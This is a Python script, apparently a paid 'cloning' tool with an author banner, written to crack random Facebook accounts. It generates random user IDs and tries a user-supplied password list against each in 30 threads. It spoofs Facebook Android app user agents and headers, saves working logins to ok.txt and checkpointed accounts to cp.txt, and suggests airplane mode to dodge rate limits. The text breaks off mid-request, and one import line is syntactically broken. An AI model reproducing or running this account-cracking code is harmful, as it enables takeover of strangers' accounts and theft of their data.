W = '\033[97;1m' 

R = '\033[91;1m' 

G = '\033[92;1m' 

Y = '\033[93;1m' 

B = '\033[94;1m'

P = '\033[95;1m'

C = '\033[96;1m'

N = '\x1b[0m'

import os

try:

	import requestsexcept ImportError:

	os.system("pip install requests")

try:

	import concurrent.futures

except ImportError:

	os.system("pip install futures")

import os

import sys

import time

import requests

import random

import platform

import base64

import subprocess

from concurrent.futures import ThreadPoolExecutor

def runtxt(z):

    for e in z + "\n":

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.03)

plist = (platform.uname())[2]

basex = plist

basex1 = basex.encode('ascii')

basex2 = base64.b64encode(basex1)

basex3 = basex2.decode('ascii')

base4 = (basex3).upper()

basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')

class Main:

	def __init__(self):

		self.id = []

		self.ok = []

		self.cp = []

		self.loop = 0

		os.system("clear")

		

		print ("""\033[1;92m 

 /                            )

          (                             |\

         /|                              \\

        //                                \\

       ///                                 \|

      /( \                                  )\

      \\  \_                               //)

       \\  :\__                           ///

        \\     )                         // \

         \\:  /                         // |/

          \\ / \                       //  \

           /)   \   ___..-'           (|  \_|

          //     /   _.'              \ \  \

         /|       \ \________          \ | /

        (| _ _  __/          '-.       ) /.'

         \\ .  '-.__            \_    / / \

          \\_'.     > --._ '.     \  / / /

           \ \      \     \  \     .' /.'

            \ \  '._ /     \ )    / .' |

             \ \_     \_   |    .'_/ __/

              \  \      \_ |   / /  _/ \_

               \  \       / _.' /  /     \

               \   |     /.'   / .'       '-,_

                \   \  .'   _.'_/             \

   /\    /\      ) ___(    /_.'           \    |

  | _\__// \    (.'      _/               |    |

  \/_  __  /--'`    ,                   __/    /

  (_ ) /b)  \  '.   :            \___.-'_/ \__/

  /:/:  ,     ) :        (      /_.'__/-'|_ _ /

 /:/: __/\ >  __,_.----.__\    /        (/(/(/

(_(,_/V .'/--'    _/  __/ |   /

 VvvV  //`    _.-' _.'     \   \

   n_n//     (((/->/        |   /

   '--'         ~='          \  |

                              | |_,,,

                 snd          \  \  /

                               '.__)

      .o.       oooooo   oooooo     oooo       .o.       ooooo  .oooooo..o

     .888.       `888.    `888.     .8'       .888.      `888' d8P'    `Y8

    .8"888.       `888.   .8888.   .8'       .8"888.      888  Y88bo.

   .8' `888.       `888  .8'`888. .8'       .8' `888.     888   `"Y8888o.

  .88ooo8888.       `888.8'  `888.8'       .88ooo8888.    888       `"Y88b

 .8'     `888.       `888'    `888'       .8'     `888.   888  oo     .d8P

o88o     o8888o       `8'      `8'       o88o     o8888o o888o 8""88888P'

                                                                                

\033[1;90m══════════════════════════════════════════════════

\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : MR-AWAIS

\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mYT CHANNEL : TECHNICAL AWAIS

\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : AWAISMOMAN

\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mTOOLS TYPE  : PAID

\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92m MY WP NUM:+923173725015

\033[1;90m══════════════════════════════════════════════════

    """)

		print("%s [%s•%s] %sTOOL NAME : %sPAKISTAN"%(G,R,G,B,G))

		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))

		print("")

		print("\n    \033[0;92m            UID🔥 CLONING🔥 \033[0;97m ")

		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 {JUST NOW} %s(PAID)"%(G,R,G,Y,B))

		tanya = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")

		if tanya in ["", " "]:

			Main()

		elif tanya in ["1", "01"]:

				    self.fbtua()

		

	def fbtua(self):

		x = 111111111

		xx = 999999999

		idx = "100000" 

		limit = int(input("    \033[0;91m[+]\033[0;92m TOTAL IDS TO CRACK (LIMIT 50000): "))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n    [#] CRACK COMPLETE...")

		except Exception as e:exit(str(e))

	def api(self, uid, pwx):

		ua = random.choice([

			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 

			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"

		])

		sys.stdout.write(

			"\r\r %s[>_] [AWAIS-CP] : %s/%s -> \033[0;92m [ AWAIS-OK:%s ]- \033[0;91m[AWAIS-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))

		); sys.stdout.flush()

		for pw in pwx:

			pw = pw.lower()

			ses = requests.Session()

			headers = {

				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 

				"x-fb-sim-hni": str(ran
